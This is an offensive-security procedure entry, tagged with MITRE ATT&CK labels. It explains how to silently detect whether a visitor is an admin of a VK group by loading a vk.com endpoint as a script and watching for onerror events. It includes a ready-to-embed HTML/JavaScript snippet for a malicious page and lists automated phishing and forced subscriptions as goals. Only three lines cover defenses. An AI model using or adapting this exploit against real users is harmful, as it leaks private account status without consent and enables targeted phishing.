---
tags:
  - csrf
  - javascript
  - silent-detection
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/vk-admin-detection-script]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:27:42.426Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 2c178fee-8d37-4e3b-989e-5b180a09c2eb
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
---
# Implement-Silent-JavaScript-Admin-Detection

## Summary

This procedure deploys JavaScript to silently detect VK group admin status by loading the endpoint as a script source and handling onerror events, avoiding user interaction.

## Description

Using dynamic script creation, the endpoint is loaded; non-admins trigger onerror (error response), admins load silently. Variants can detect login status or prompt subscriptions. Exploits no CSRF checks and script-load permissiveness. Requires embedding in a malicious page.

## Requirements

1. Malicious HTML page
2. Target GID
3. Victim's VK session

## Defense

Defensive measures and detection strategies:

- Sanitize script sources with CSP
- Uniform error handling to avoid onerror triggers
- Monitor for script-load anomalies

## Objectives

1. Non-interactive status detection
2. Enable automated phishing
3. Escalate to actions like subscriptions

## Instructions

### Step 1: Embed Detection Script

**Context**: Add JS to page for script creation.

Execute [[commands/vk-admin-detection-script]]:

```html
<body>
<script>var script = document.createElement('script');
 script.src = "https://vk.com/al_groups.php?act=to_public_box&al=1&gid=147481257";
 document.body.appendChild(script);
 script.onerror = function() {
 alert( "No admin" );
 };
 </script>
 </body>
```

> For admins: No alert; for non-admins: Alert triggers on error.

### Step 2: Extend for Login Detection

**Context**: Modify for broader use.

Change onerror to check login or prompt subscription.

> Success: Silent inference.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[Drive-by Compromise]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/vk-admin-detection-script]]

## Tools Used


## Tags

- [[JavaScript]]
- [[silent-detection]]
